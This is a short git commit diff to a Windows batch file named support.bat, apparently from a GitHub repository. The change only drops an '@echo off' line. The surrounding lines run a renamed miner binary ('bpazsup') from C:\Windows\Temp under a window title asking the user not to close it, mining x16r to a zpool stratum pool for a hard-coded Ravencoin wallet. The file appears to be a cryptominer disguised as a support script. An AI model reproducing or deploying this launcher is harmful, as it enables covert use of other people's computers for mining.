07b4ac0acefeaf5bc380328c4a8c43a1cdea2a0f
Neyarito <99420322+Neyarito@users.noreply.github.com>
2022-05-27 02:31:13 +0200

    Update support.bat

--- support.bat
+++ support.bat
@@ -1,5 +1,4 @@
 title Merci de ne pas fermer cette fenetre
 cd C:\Windows\Temp
-@echo off
 color 54
 bpazsup -a x16r -o stratum+tcp://x16r.eu.mine.zpool.ca:3636 -u RHVcfq9xqSK7Qwe63TitgkksSFQNufEkYC.bpazC -p c=RVN
